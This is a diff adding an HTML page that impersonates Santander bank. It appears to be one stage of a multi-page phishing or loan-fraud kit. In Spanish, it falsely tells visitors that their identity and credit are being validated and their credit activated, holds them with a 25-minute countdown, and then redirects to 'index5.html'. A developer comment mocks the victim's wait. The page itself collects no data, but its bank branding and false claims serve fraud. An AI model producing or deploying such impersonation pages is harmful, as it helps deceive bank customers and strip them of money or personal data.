@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de Seguridad - Santander</title>
+  <link rel="shortcut icon" type="image/x-icon" href="https://www.santander.com/favicon.ico">
+
+  <style>
+    :root {
+      --santander-red: #ec0000;
+      --santander-red-dark: #c40000;
+      --gray-text: #667781;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body, html { height: 100%; width: 100%; font-family: "Segoe UI", Arial, sans-serif; overflow: hidden; }
+
+    body {
+      background: linear-gradient(135deg, #ec0000 0%, #ff3333 50%, #ec0000 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .background-shapes { position: fixed; width: 100%; height: 100%; top: 0; left: 0; z-index: 0; }
+    .shape { position: absolute; opacity: 0.2; border-radius: 50%; background: white; }
+    .shape1 { width: 300px; height: 300px; top: -100px; left: -100px; }
+    .shape2 { width: 200px; height: 200px; bottom: -50px; right: -50px; }
+
+    .verification-container { width: 92%; max-width: 460px; z-index: 10; animation: fadeInUp 0.6s ease-out; }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .verification-box {
+      background: white;
+      border-radius: 20px;
+      padding: 40px 30px;
+      box-shadow: 0 15px 50px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    .logo-box {
+      background-color: var(--santander-red);
+      color: white;
+      padding: 10px 25px;
+      display: inline-block;
+      margin-bottom: 25px;
+      border-radius: 4px;
+    }
+
+    .logo-box span { font-weight: bold; font-size: 26px; letter-spacing: -1px; }
+
+    h2 { font-size: 20px; font-weight: 700; color: #222; margin-bottom: 10px; }
+    
+    .info-text { font-size: 14px; color: var(--gray-text); line-height: 1.6; margin-bottom: 20px; }
+
+    #timer-display {
+      font-size: 48px;
+      font-weight: 800;
+      color: var(--santander-red);
+      font-family: 'Courier New', Courier, monospace;
+      margin: 15px 0;
+    }
+
+    progress { width: 100%; height: 12px; appearance: none; border-radius: 10px; overflow: hidden; margin-bottom: 15px; }
+    progress::-webkit-progress-bar { background-color: #eee; }
+    progress::-webkit-progress-value { background: var(--santander-red); transition: width 1s linear; }
+
+    .warning-footer {
+      background: #fff9c4;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 12px;
+      color: #856404;
+      border: 1px solid #ffeeba;
+      margin-top: 10px;
+      text-align: left;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="background-shapes">
+    <div class="shape shape1"></div>
+    <div class="shape shape2"></div>
+  </div>
+
+  <div class="verification-container">
+    <div class="verification-box">
+      <div class="logo-box">
+        <span>Santander</span>
+      </div>
+      
+      <h2>Revisión Final de Documentación</h2>
+      <p class="info-text">El sistema de riesgos está validando su identidad y capacidad crediticia. <b>Por favor, mantenga esta ventana abierta</b> para concluir el proceso exitosamente.</p>
+      
+      <div id="timer-display">25:00</div>
+      
+      <progress id="progressBar" value="0" max="1500"></progress>
+      
+      <div class="warning-footer">
+        ⚠️ <b>IMPORTANTE:</b> Evite refrescar o salir del proceso <b>Historial interbancario en proceso</b> (SU CREDITO ESTA SIENDO ACTIVADO) Espere a que el contador finalice.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // 25 minutos = 1500 segundos
+    const TOTAL_SECONDS = 1500; 
+    let remainingSeconds = TOTAL_SECONDS;
+    const progressBar = document.getElementById("progressBar");
+    const timerDisplay = document.getElementById("timer-display");
+
+    const countdown = setInterval(() => {
+      remainingSeconds--;
+
+      let mins = Math.floor(remainingSeconds / 60);
+      let secs = remainingSeconds % 60;
+
+      timerDisplay.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+
+      // La barra se va llenando proporcionalmente a los 1500 segundos
+      progressBar.value = TOTAL_SECONDS - remainingSeconds;
+
+      if (remainingSeconds <= 0) {
+        clearInterval(countdown);
+        // Cuando termine el calvario de los 25 min, lo mandas al index5
+        window.location.href = 'index5.html';
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
